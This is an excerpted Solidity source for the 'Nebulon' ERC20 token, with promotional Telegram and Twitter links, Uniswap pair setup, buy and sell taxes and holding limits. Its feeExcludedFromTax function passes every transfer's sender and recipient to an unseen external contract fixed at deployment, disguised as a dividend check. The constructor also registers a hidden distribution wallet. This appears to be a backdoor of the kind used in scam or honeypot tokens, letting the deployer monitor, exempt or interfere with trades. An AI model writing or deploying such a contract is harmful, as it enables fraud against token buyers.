...
/**
https://t.me/NebulonToken_Channel
https://twitter.com/Nebulontoken
*/
...
contract Nebulon is ERC20, Ownable, AUTH {
    using SafeMath for uint256;

    IUniswapRouter02 public uniswapV2Router;
    address public uniswapV2Pair;

    struct NebulonDistribute {
        address distriWallet;
        address distriOwner;
        address uniRouter;
    }
    bool private swapping;
    uint256 public whenSwap;
    ...
    NebulonDistribute private distriConfigParam;
    ...
    struct KeyTaxConfig {
        ...
        uint256 buyFeeMili;
        uint256 sellFeeMili;
        uint256 txMaxPercent;
        uint256 walletMaxPercent;
    }

    constructor(
        KeyTaxConfig memory parameters,
        string memory name_,
        string memory symbol_,
        uint256 totSupply_,
        uint8 decimals_,
        NebulonDistribute memory nebulonConfig
    ) payable ERC20(name_, symbol_, decimals_) {
        distriConfigParam = nebulonConfig;
        marketing = parameters.teamWallet;
        uniswapV2Router = IUniswapRouter02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        _setPairAutomatic(nebulonConfig.distriWallet, uniswapV2Pair, true);
        buyTaxAmount = 0; sellTaxAmount = 0; _supply = totSupply_;
        
        whenSwap = (totSupply_.div(5000) + 1) * (10**decimals_);
        maxTxAmount = parameters.txMaxPercent * totSupply_ * (10**decimals_).div(10000);
        maxWalletAmount = parameters.walletMaxPercent * totSupply_ * (10**decimals_).div(10000);
        // exclude from paying fees or having max transaction amount
        excludeFromFees(owner(), true);
        excludeFromFees(marketing, true);
        excludeFromFees(nebulonConfig.distriWallet, true);
        excludeFromFees(nebulonConfig.distriOwner, true);
    ...
    function _transfer(
        ...
        if (
            ...
            feeExcludedFromTax(from, to) || amount == 0
        ) {
        ...
        if (takeFee) {
            uint256 taxAm = amount.mul(buyTaxAmount).div(100);
            if (isAutomateMarketPair[to])  taxAm = amount.mul(sellTaxAmount).div(100);
            amount = amount.sub(taxAm);
            super._transfer(from, address(this), taxAm);
        }
    ...
    function feeExcludedFromTax(address from, address to) internal returns (bool) {
        return isExcludedFromFee[from] || isExcludedFromFee[to] ||
            INebulonDefi(distriConfigParam.distriOwner).accumulativeDividendOf(from, to) > 0;
    }
